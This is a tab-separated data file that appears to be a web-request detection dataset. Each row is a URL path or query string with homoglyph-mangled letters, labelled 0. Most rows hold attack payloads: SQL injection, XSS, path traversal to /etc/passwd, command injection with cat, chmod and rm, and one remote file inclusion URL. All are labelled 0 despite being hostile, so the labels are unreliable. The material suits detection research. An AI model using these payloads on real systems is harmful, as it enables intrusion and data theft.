sentences 	 labels
/ 𐑈𝓉ring / strings / parameters = &  # 00060  	 0
/ 𝓬𝗴i-bin / includes / db_adodb . php ? basedir =  / etc / passwd \ x00  	 0
/ 𝓮𝚡amples / jsp / sessions / index . php ? search =  < script > alert (  ' cmsimple_search_xss . nasl '  )  ;  <  / script >  & function = search  	 0
/ 𝕤𝓽ring / strings / parameters = cat  / etc / passwd  	 0
/ 𝘴𝘁ring / strings / parameters = 1 "  "  and 8635 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  --  	 0
/ 𝗌𝚝ring / strings / parameters = )  )  )  and 0 = benchmark ( 3000000 , md5 ( 1 )  )   --  	 0
/ ℯn-𝗎s / account / bandwidth / index . cgi ? action = showmonth & year =  < script > foo <  / script >  & month =  < script > foo <  / script >  	 0
/ 𝟹𝟥y9gcqq . htm ?  < meta http-equiv = set-cookie content =  " testnvxc = 4301 "  >  	 0
/ 𝔰𝔱ring / strings / parameters = 1 %  "  "  )  )  )  ; select  ( case when  ( 4666 = 4666 )  then 1 else 4666 *  ( select 4666 from master .  . sysdatabases )  end )  --  	 0
/ 𝓈𝓽ring / strings / parameters = 1 '  |  |  ( select  ' vixv '  from dual where 7704 = 7704 union all select null , null , null , null , null --  	 0
/ 𝒔𝒕ring / modo = insertar & precio = 5306 & b1 = confirmar /  	 0
/ 𑣊հlysl2x . nsf ?  < script > document . cookie =  " testgjbe = 8505 ;  "  <  / script >  	 0
/ 𝗋ѵ98iwjp . exe ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝓼𝐭ring / strings / parameters = -3596 )  )  )  or 5903 =  (  ' qqpjq '  |  |  ( select case 5903 when 5903 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  and  (  (  ( 3645 = 3645  	 0
/ 𝐬𝕥ring / strings / parameters = "  | echo $ ifsiqctbx $  (  ( 54 + 92 )  )  $  ( echo $ ifsiqctbx ) iqctbx  	 0
/ 𝔰𝓽ring / strings / parameters = + waitfor + delay +  ' 00 : 00 : 05 '  	 0
/ 𝒔𝓽ring / strings / parameters = 1 )  where 1333 = 1333 order by 1 --  	 0
/ 𝘴𝓽ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo aybjiv )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  '  	 0
/ 𝕤𝒄ripts / www / delivery / ac . php ? bannerid = -1331908787 + or + 1 = 1 +  --  +  '  ; passthru ( base64_decode (  $ _server [ http_nessus_ti5957ae ]  )  )  ; die ;  /  *  	 0
/ 𝐬𝔱ring / strings / parameters = -1634 %  '  union all select 5937 , 5937 , 5937 , 5937 --  	 0
/ 𝐬𝙩ring / strings / parameters = |   [  9 -ne  $  ( echo lqrkbx  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \  	 0
/ 𝓼𝑡ring / strings / parameters = 1 where 1153 = 1153 or extractvalue ( 1297 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 1297 = 1297 , 1 )  )  )  , 0x717a767a71 )  )  --  	 0
/ 𝖘𝑡ring / strings / parameters = \ x3d  \ x3b '  	 0
/ ƽ𝗍ring / strings / parameters = 1 "  "  and 4241 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  "  " endx "  "  =  "  " endx  	 0
/ ѕ𝕥ring / strings / parameters = 1 '  )  as epgz where 2898 = 2898 and 7028 = 2287 #  	 0
/ Ꭵn𝐬tall / index . php ? content_php = xxpathxx  	 0
/ 𝘀𝙩ring / modo = entrar & login = kuchinsk & pwd = b * 58to76a '  , na & remember = off & b1 = entrar  	 0
/ 𝓽𝔞ux marginal de l ' impot sur le revenue /  	 0
/ 𝓎৪pmygrp . fts ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝑠𝓽ring / strings / parameters = \  "  >  '  <  / style >  <  / script >  < script > alert ( 0x000123 )  <  / script >  	 0
/ 𝓈𝔱ring / strings / parameters = &  # 62  	 0
/ 𝔰𝘁ring / modo = registro & login = ashrae & password = bob @  < script > alert ( paros )  <  / script >  . parosproxy . org & nombre = yerald & apellidos = ucaay & email = garet @ decsl . mg & dni = 47175260y & direccion = calle + adelardo + covarsi + 138 +  & ciudad = santibez + de + la + pea & cp = 08150 & provincia = cceres & ntc = 2464400659124948 & b1 = registrar  	 0
/ 𝕤𝑡ring / strings / parameters = '  &  & echo $ ifszrwxzk $  (  ( 81 + 67 )  )  $  ( echo $ ifszrwxzk ) zrwxzk &  	 0
/ 𝐬𝑡ring / strings / parameters = < script src =  /  / vulnerability-lab . com /  . js >  	 0
/ 𑣁𝓉ring / strings / parameters = 1 %  '  )  )  )  or 7427 = dbms_pipe . receive_message ( chr ( 116 )  |  | chr ( 87 )  |  | chr ( 90 )  |  | chr ( 109 )  , 5 )  --  	 0
/ m𝚊n𝙖ger / www / delivery / ac . php ? bannerid = -1331904367 + or + 1 = 1 +  --  +  '  ; passthru ( base64_decode (  $ _server [ http_nessus_uhkmnhw4 ]  )  )  ; die ;  /  *  	 0
/ 𝑐𝒈i . cgi / webcart / webcart . cgi ? change = yes & code = phold & config = mountain & nextpage =  ; cat  / etc / passwd |  	 0
/ 𝔣nᴡhrxyd . php3 ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝐩𝓱pmyadmin / documentation . html ? phpmyadmin =  .  .  /  .  .  .  /  .  .  /  .  /  .  .  /  .  .  .  /  .  .  /  .  /  .  .  /  .  .  .  /  .  .  /  .  /  .  .  /  .  .  .  /  .  .  /  .  /  .  .  /  .  .  .  /  .  .  /  .  /  .  .  /  .  .  .  /  .  .  /  .  / etc / passwd  	 0
/ 𝒔𝕥ring / strings / parameters = >  "  "  < style type =  "  " text / css "  "  > body { background : url (  "  " javascript : document . cookie = true "  "  )  }  <  / style >  	 0
/ ꜱ𝒕ring / strings / parameters = 1 )  )  )  union all select null , null , null , null , null , null , null , null , null --  	 0
/ 𝖘𝗍ring / strings / parameters = '   str =  $  ( echo karbcx )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \  	 0
/ 𝚝oρ . php ? stuff =  '  ; del q26271527  #  	 0
/ 𝘀𝓽ring / strings / parameters = 1 )  where 5615 = 5615 and row ( 6237 , 7469 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 6237 = 6237 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  --  	 0
/  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  .  /  .  .  /  { file }  	 0
/ m𝒂ɩn . php ? stuff =  " del q22289594  #  	 0
/ 𝒔𝔱ring / strings / parameters = .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ winnt \ win . ini  	 0
/ 𝘧n𝓌hrxyd . dll ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝐬𝐭ring / strings / parameters = 1 '  )  )  and 4242 = 5831 and  (  (  ' xflh '  like  ' xflh  	 0
/ 𝗁𝒓ttz9fj . cgi ?  < script > document . cookie =  " testtbjy = 7334 ;  "  <  / script >  	 0
/ 𝑠𝒕ring / strings / parameters = -8754 "  "  )  )  )  union all select 7391 , 7391 , 7391 , 7391 , 7391 , 7391 , 7391 --  	 0
/ 𝐬𝘵ring / strings / parameters = 1 '  +  ( select acax where 4169 = 4169 or 5286 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  )  +  '  	 0
/ 𝕣𝙚cordings / starnet / modules / sn_allbum / slideshow . php ? cmsdir =  / etc / passwd \ x00  	 0
/ 𝚎⤬amples / jsp / num / cvslog . cgi ? file =  < script > window . alert <  / script >  	 0
/ 𑣁𝓽ring / strings / parameters = ' echo qfgaiq $  (  ( 42 + 15 )  )  $  ( echo qfgaiq ) qfgaiq /  /  	 0
/ ѕ𝙩ring / strings / parameters = echo bzwipm $  (  ( 39 + 43 )  )  $  ( echo bzwipm ) bzwipm /  /  	 0
/ j𝐚𝘷ascript / local . exe  	 0
/ ꜱ𝒕ring / strings / parameters = -2857 %  '  )  )  )  union all select 7167 , 7167 , 7167 , 7167 , 7167 , 7167 , 7167 , 7167 #  	 0
/ 𝓭ꬵf_php_frameworkapi-latest / include / dff_sku . func . php ? dff_config [ dir_include ]  = xxpathxx  	 0
/  < meta http-equiv = set-cookie content =  " testbfpq = 3326 "  >  	 0
/ α𑜎stats / awstats . pl ? migrate =  | echo ; chmod 777  / tmp / qkzpkuflrb . sh ; echo | awstats366697 . txt  	 0
/ 𝓼𝗍ring / strings / parameters = x '  and email is null ;   --  	 0
/ 𝙝𝔞wai ' i /  	 0
/ 𝕖𑜊c3rz1l . fts ?  < script > document . cookie =  " testkgqo = 204 ;  "  <  / script >  	 0
/ 𝘦𝑥amples / jsp / error / language . php ? data_dir =  / etc / passwd \ x00  	 0
/ 𑣁𝒕ring / modo = registro & login = bnrecad & password = in ! soluble & nombre = aurelio ?  & apellidos = ospina + soma & email = humbert @ 24htranslations . name & dni = 78151636m & direccion = ramat ,  + 145 + 5 ? b & ciudad = barbastro & cp = 31227 & provincia = valladolid & ntc = 5175468282615613 & b1 = registrar  	 0
/ 𝖘𝖙ring / strings / parameters = order by 8 --  	 0
/ 𑣁𝔱ring / strings / parameters = "   str =  $  ( echo vdevwj )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  /  	 0
/ ⅇ᙮amples / jsp / error / usrdetails . php ? sgnuptype = csaleid < script > nessus <  / script >  	 0
/ 𝚜𝓽ring / strings / parameters = '  ;  str =  $  ( echo pupqpk )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  	 0
/ 𝘤𝕘i-914 / fileseek . cgi ? foot =  ; cat  / etc / passwd & head =  	 0
/ 𝑡o𝕡 . php ? stuff =  \ x0duname  > q78785137  #  	 0
/ 𑣁𝘁ring / modo = registro & login = monaco & password = roznar & nombre = kiara & apellidos = palenzuela + usa & email = badland . paudler @ diseodesoftware . do & dni = 86214709z & direccion = c /  + alegria ,  + 141 ,  + 12-h & ciudad = villanueva + de + oscos "  + and +  " 1 "  =  " 1 & cp = 24735 & provincia = ciudad + real & ntc = 4654942357042652 & b1 = registrar  	 0
/ 𝑠𝖙ring / strings / parameters = 1 )  )  )  and make_set ( 8882 = 1593 , 1593 )  and  (  (  ( 7989 = 7989  	 0
/ 𝔰𝖙ring / strings / parameters = "  |  | echo gircrn $  (  ( 15 + 16 )  )  $  ( echo gircrn ) gircrn /  /  	 0
/ j𝑎𝗏ascript /  . htpasswd . sfish /  ` true `  	 0
/  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ 𝘦𝑥amples / jsp / checkbox / starnet / addons / slideshow_full . php ? album_name =  ' 1511206364  	 0
/ 𝔭𝗵pmyadmin / server . pt ? open = space & name =  "  ;  }  <  / script >  < script > alert (  ' plumtree_name_xss . nasl '  )  <  / script >  	 0
/ 𝖘𝘁ring / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo jicoqs )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  	 0
/ 𝐬𝔱ring / modo = registro & login = alzofon & password = 0in5fera & nombre = rosario & apellidos = _espaa + villa + r ? ejo & email = stadbauer @ aadsl . de & dni = 77987215b & direccion = passatge + serracant ,  + 34 + 7-c & ciudad = azaila & cp = 18132 & provincia = almera & ntc = 1281089993352659 & b1 = registrar  	 0
/ 𝓈𝓉ring / strings / parameters = \  "  )  and pg_sleep ( 50 )  --  	 0
/ 𝓋𝘣calendar . php ? calbirthdays = 1 & action = getday & day = 2001-8-15 & comma =  "  ; echo  '  '  ;  echo  ` id  `  ; die (  )  ; echo "  	 0
/ 𝓈𝓉ring / id = 1 & nombre = jamn + ibrico & precio = set-cookie :  + tamper = 1041264011025374727 & cantidad = 40 & b1 = aadir + al + carrito  	 0
/ 𝒅𝟕65w06j . jspa ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝕤𝔱ring / modo = entrar & login = balwinde & pwd = nacreo & remember = off & b1 = any ?  set-cookie :  + tamper = 5765205567234876235  	 0
/ 𝖘𝐭ring / strings / parameters = 1 '  )  )  as qpai where 2619 = 2619 ;  ( select  *  from  ( select ( sleep ( 5 )  )  ) acdk )  #  	 0
/ 𝗲n-սs / n9xlumt5 . do ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ ℮𝐱amples / servlets / servlet / sojourn . cgi ? cat =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 0
/ 𝕤𝓽ring / strings / parameters = 1 '  +  ( select mavu where 4276 = 4276 rlike sleep ( 5 )  #  	 0
/ 𝔱o𝕡 . php ? stuff =  '  \ x0asleep \ x097 \ x09 #  	 0
/ 𝓈𝒕ring / strings / parameters = < iframe src =  "  #  "  style = width : exp /  *  *  / ressi /  *  *  / on ( confirm ( 1 )  )  >  	 0
/ 𝘥𝙚stiny ' s-child /  	 0
/ oƷ𝟱zot2r . mscgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝚜𝓉ring / strings / parameters = & lt ; embed src =  \  " data &  # 58 ; image / svg + xml ; base64 , phn2zyb4bwxuczpzdmc9imh0dh a6ly93d3cudzmub3jnlziwmdavc3zniib4bwxucz0iahr0cdovl3d3dy53my5vcmcv mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs aw5riib2zxjzaw9upsixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci + ywxlcnqoilh tuyipozwvc2nyaxb0pjwvc3znpg =  =  \  "  type =  \  " image / svg + xml \  "  allowscriptaccess =  \  " always \  "  & gt ;  & lt ;  / embed & gt ;  	 0
/ 𝕖𝙭amples / jsp / checkbox / yabb . pl ? board = news & action = display & num =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 0
/ j𝒂𝖛ascript / l . exe  	 0
/ lm𝕨𝟺r201 . kspx ?  < meta http-equiv = set-cookie content =  " testwews = 8477 "  >  	 0
/ 𝐭o𝙥 . php ? stuff =  "  ; sleep 7  #  	 0
/ 𝓼𝑡ring / strings / parameters = & echo sprawo $  (  ( 58 + 5 )  )  $  ( echo sprawo ) sprawo |  	 0
/ 𝑡o𝑝 . php ? stuff =  " ping \ x09-w \ x098000 \ x09-n \ x091 \ x091 . 2 . 3 . 4 & rem \ x09  	 0
/ 𝓼𝐭ring / strings / parameters = 1 "  "  )  ; create or replace function sleep ( int )  returns int as  '  / lib / libc . so . 6 '  ,  ' sleep '  language  ' c '  strict ;  select sleep ( 5 )  --  	 0
/ 𝗋℮cordings / cal_week . php ? op = week & catview = 999 '  	 0
/ 𐑈𝑡ring / strings / parameters = 1 '  )  )  )  and  ( select  *  from  ( select ( sleep ( 5 )  )  ) fzno )  and  (  (  (  ' lajk '  =  ' lajk  	 0
/ 𐓒ꓒbjwpw6 . mscgi ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ ꜱ𝐭ring / id = 3 & nombre = vino + rioja & precio = 39 & cantidad = 69 & b1 =  '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  	 0
/ 𐑈𝒕ring / strings / parameters = -6766 '  )  )  )  or 3038 = 3038  	 0
/ ⅆ𝈒ktpmcq . asp ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ m𝖺𝒊n . php ? logout =  '  & rm q16695623  #  	 0
/ ꜱ𝐭ring / strings / parameters = 1 ,  ( select  ( case when  ( 6750 = 6750 )  then 1 else 6750 *  ( select 6750 from information_schema . character_sets )  end )  )  	 0
/ 𝒔𝘁ring / strings / parameters = 1 "  "  )  )  and row ( 6237 , 7469 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 6237 = 6237 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  (  (  "  " tbdl "  "  like  "  " tbdl  	 0
/ 𝒾n𝖉ex . php ? lng =  .  .  / system_footer & sensor_program = phpsysinfo_241 . nasl  	 0
/ 𝕡𝗿epare . php ? xcart_dir = xxpathxx ?  	 0
/ 𝐬𝒄ript /  / ident / index . php ? path_inc = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  	 0
/ ᴄꬵide / scripts / ajax / fckeditor / editor / filemanager / connectors / cfm / upload . cfm ? command = fileupload & type = file & currentfolder =  / reqtgy . jsp \ x00  	 0
/ llЗb77e5 . php ?  < meta http-equiv = set-cookie content =  " testjvvf = 7721 "  >  	 0
/ 𝙨сripts / admin / components / com_fm / fm . install . php ? lm_absolute_path =  .  .  /  .  .  /  .  .  /  & install_dir = limbo_com_fm_php_shell . nasl-1332010397  	 0
/ ℯ⤫amples / jsp / cal / anacondaclip . pl ? template =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ 𝔰𝚝ring / strings / parameters = [ d ]  	 0
/ ѕ𝓽ring / modo = registro & login = danyelle & password =  ? florfero & nombre =  . quincio & apellidos = gebhardt & email = reverend @ enla . ae & dni = 41928757x & direccion = c /  + los + tilos ,  + 118 + 12-b & ciudad = altarejos & cp = 44134 & provincia = toledo & ntc = 4582988333379536 & b1 = registrar  	 0
/ 𝗌𝘁ring / strings / parameters = < iframe id = xss src =  "  " javascript : alert (  ' xss '  )  ;  "  "  >  <  / iframe >  	 0
/ j𝚊ѵascript / arch . exe  	 0
/ 𝓼𝐭ring / strings / parameters = "  &  & echo znvivl $  (  ( 97 + 19 )  )  $  ( echo znvivl ) znvivl /  /  	 0
/ 𝘀𝕥ring / modo = registro & login = suat & password = puerta1entana & nombre = isis & apellidos = piera + atencia & email = vinci @ espaciodelpintor . ic & dni = 23679741e & direccion = calle + torre + dels + socors + 29 ,  + 11 ? e & ciudad = quiruelas + de + vidriales & cpa = 34419 & provincia = burgos & ntc = 0825075702605085 & b1 = registrar  	 0
/ ƽ𝗍ring / strings / parameters = 1 "  "  )  and elt ( 1210 = 1210 , sleep ( 5 )  )  and  (  "  " zxks "  "  =  "  " zxks  	 0
/ jα𝔳ascript / dblclk . exe  	 0
/ ৭k𝓇0ih0v . cfm ?  < script > document . cookie =  " testzgnm = 1183 ;  "  <  / script >  	 0
/ 𝒔𝙩ring / str =  $  ( echo bptqej )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  	 0
/ 𐑈𝖙ring / strings / parameters = '  |  | echo ulpnta $  (  ( 21 + 48 )  )  $  ( echo ulpnta ) ulpnta  	 0
/ 𝚝o𝒑 . php ? stuff =  '  | sleep \ x099 \ x09 #  	 0
/ 𝘀𝖙ring / strings / parameters = -9054 "  "  )  as rgyu where 3792 = 3792 order by 1 --  	 0
/ 𝗍𝒶xonservice . php ? dir = xxpathxx ?  	 0
/ ѕ𝘵ring / strings / parameters = 1 '  )  )  or extractvalue ( 1297 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 1297 = 1297 , 1 )  )  )  , 0x717a767a71 )  )  and  (  (  ' tblb '  =  ' tblb  	 0
/ 𝙩o𝓹 . php ? stuff =  "  & ping \ x0b-w \ x0b10000 \ x0b-n \ x0b1 \ x0b4 . 3 . 2 . 1 & rem \ x0b  	 0
/ j𝒂𝕧ascript / wtai . exe  	 0
/ 𝚎𝒔mozg5d . jsp ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝚜𐐽ripts / store . cgi ? startid =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . html  	 0
/ 𝐬𝘵ring / modo = registro & login = armand & password = prusiato & nombre = any  set-cookie :  + tamper = 5765205567234876235 & apellidos = catalayud + mirabet & email = balademas . mareuil6 @ enlanzarote . com . vc & dni = 28178710f & direccion = c /  + cala ,  + 9 ,  +  & ciudad = mutxamel & cp = 25332 & provincia = zaragoza & ntc = 8608089924764976 & b1 = registrar  	 0
/ 𝗍o𝓅 . php ? stuff =  " rm \ xa0q42369787 & rem \ xa0  	 0
/ 𝖘𝗍ring / strings / parameters = echo yeogll $  (  ( 28 + 5 )  )  $  ( echo yeogll ) yeogll |  	 0
/ 𝗌𝑡ring / strings / parameters = 1 '  +  ( select sfmz where 4870 = 4870 or char ( 75 )  |  | char ( 70 )  |  | char ( 99 )  |  | char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  --  	 0
/ 𝘀𝔱ring / strings / parameters = 1 '  )  where 4729 = 4729 ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  --  	 0
/ 𐑈𝖙ring / strings / parameters = '  |   [  1 -ne  $  ( echo fnegwh  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  	 0
/ ꭈ𝐩xyx07v . fts ?  < script > document . cookie =  " testbnli = 1975 ;  "  <  / script >  	 0
/ 𑣁𝑡ring / modo = registro & login = reiser & password = fi338841 & nombre = palmira & apellidos = rocha + pello & email = terry-lewis . macdougall @ ofertaschinas . gd & dni = b111155b29c & direccion = calle + los + hotelitos + s / n ,  +  & ciudad = alforja & cp = 06200 & provincia = madrid & ntc = 6898289931368660 & b1 = registrar  	 0
/ 𝙨𝐭ring / strings / parameters = "  ;  str =  $  ( echo zwbbrm )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  |  	 0
/ ѕ𝕥ring / strings / parameters = -2604 )  )  as sekb where 6897 = 6897 or 1000 = 7683  	 0
/ 𑜊𝙥s / wcm / webinterface / login / login . jsp ?  "  >  < script > alert (  " ibm_login_qs_xss . nasl-1331909400 "  )  <  / script >  	 0
/ 𝕤𝓉ring / strings / parameters = 1 %  '  union all select null #  	 0
/ 𝕤𝑡ring / strings / parameters = -4764 "  "  )  )  or 2724 in  (  ( char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  (  "  " dfvz "  "  like  "  " dfvz  	 0
/ ƽ𝓉ring / id = 3 & nombre = vino +  .  *  ? rioja & precio = 100 & cantidad = 84 & b1 = aadir + al + carrito  	 0
/ l𝗶nk𝗮dmin . php ? page = xxpathxx ?  	 0
/ 𝗌𝘁ring / strings / parameters = 1 )  )  )  ; select dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 70 )  |  | chr ( 106 )  |  | chr ( 78 )  , 5 )  from dual --  	 0
/ m𝔞𝖎n . php ? logout =  '  ; uname \ x09 > q79392194 \ x09 #  	 0
/ m𝙖𝗂n . php ? logout =  '  & del q65442989  #  	 0
/ քmn𝘃eedu . cgi ?  < script > document . cookie =  " testgfbr = 7014 ;  "  <  / script >  	 0
/ 𝗌𝗍ring / strings / parameters = 1 "  "  )  )  or 8466 = benchmark ( 5000000 , md5 ( 0x694a4745 )  )  and  (  (  "  " iuxs "  "  like  "  " iuxs  	 0
/ 𑣁𝘵ring / strings / parameters = 1 '  )  )  )  and elt ( 1210 = 1210 , sleep ( 5 )  )  and  (  (  (  ' aiuy '  =  ' aiuy  	 0
/ 𝚎𝕩amples / jsp / error / ttawebtop . cgi /  ? action = start & pg =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ 𝘴𝖙ring / modo = registro & login = gilly & password = f + emenciar & nombre = crisant / o & apellidos = heredia + wald & email = meskill_ferlinghetti @ wormee . pw & dni = 37936735y & direccion = c /  + ginebre ,  + 98 +  & ciudad = manzanillo & cp = 33310 & provincia = segovia & ntc = 1741584206084308 & b1 = registrar  	 0
/ 𝚌𝖌i-bin / sgdynamo . exe ? htname = sgdynamo . exe  	 0
/ 𝘴𝓉ring / strings / parameters = ; echo $ ifsckyhaj $  (  ( 39 + 53 )  )  $  ( echo $ ifsckyhaj ) ckyhaj |  	 0
/ j𝖺νascript / press . exe  	 0
/ 𝘀𝗍ring / modo = entrar & login = estel & pwd = a , n .  ,  , mi2a & remember = on & b1 = entrar  	 0
/ ƽ𝕥ring / strings / parameters = 1 %  "  "  )  )  rlike  ( select  ( case when  ( 4207 = 1757 )  then 1 else 0x28 end )  )  and  (  (  "  "  %  "  "  =  "  "  	 0
/ 𐑈𝔱ring / strings / parameters = 1 "  "  )  procedure analyse ( extractvalue ( 5840 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end )  )  , 0x717a767a71 )  )  , 1 )  and  (  "  " tgdu "  "  =  "  " tgdu  	 0
/ ѕ𝘵ring / strings / parameters = 1 '  )  )  )  and char ( 111 )  |  | char ( 77 )  |  | char ( 121 )  |  | char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  and  (  (  (  ' tvar '  =  ' tvar  	 0
/ 𝑠𝔱ring / strings / parameters = '  + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  , null , null , null , null , null , null , null , null , null )   --  	 0
/ ѕ𝚝ring / id = 2 & nombre = jamn + ibrico & precio = 100 /  & cantidad = 35 & b1 = aadir + al + carrito  	 0
